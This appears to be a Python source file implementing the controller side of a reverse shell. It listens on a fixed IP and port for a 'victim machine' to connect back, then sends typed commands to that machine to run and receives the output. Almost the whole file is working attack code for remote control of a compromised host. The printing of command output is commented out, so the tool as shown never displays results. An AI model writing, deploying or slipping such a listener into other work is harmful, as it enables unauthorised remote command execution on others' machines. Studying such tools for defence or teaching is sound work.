#!/usr/bin/python3
'''
Author: Ezra Fast
Description: This is the brother code to reverseShell.py; this handles the connection made to the controller by the victim machine; commands can be run on the remote machine once a session has been established.
Date: November 2, 2023
'''

# resource: https://realpython.com/python-sockets/

import socket
import argparse

# sHOST = socket.gethostbyname('kali')
sHOST = '192.168.0.28'
sPORT = 9999

'''
making the listening socket:
        - socket()
        - socket.bind()
        - socket.listen()
        - socket.accept()
'''
def acceptConnection():
    try:
        socketInit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socketInit.bind((sHOST, sPORT))
        socketInit.listen()
        connection, clientAddress = socketInit.accept()             # connection is the socket that will be used to communicate with the victim (client)
    except Exception as error:
        print(f'Exception raised: {error}\nExiting...')
        exit(0)
    return connection

'''
session flow: client side
        - send prompt
        - receive command
        - execute command
        - send output
        - repeat
'''
'''
session flow: server side:
        - receive prompt
        - send command
        - receive output
        - print output
        - repeat
'''

def session(clientConnection):
    commandOutput = ''
    prompt = ''
    while True:
        commandOutput = ''
        while 1:
                data = clientConnection.recv(1024)
                prompt += data.decode()
                if len(data) < 1024:
                     break
        command = input(f'{prompt} ')
        prompt = ''
        clientConnection.sendall(command.encode())
        while 1:
                receiving = clientConnection.recv(1024)
                commandOutput += receiving.decode()
                if len(receiving) < 1024:
                        break
        # print(commandOutput)
        command = ''

if __name__ == "__main__":
    try:
        clientConnection = acceptConnection()
        session(clientConnection)
    except Exception as e:
        print(f'Session terminated.\nError: {e}.\nExiting...\n')
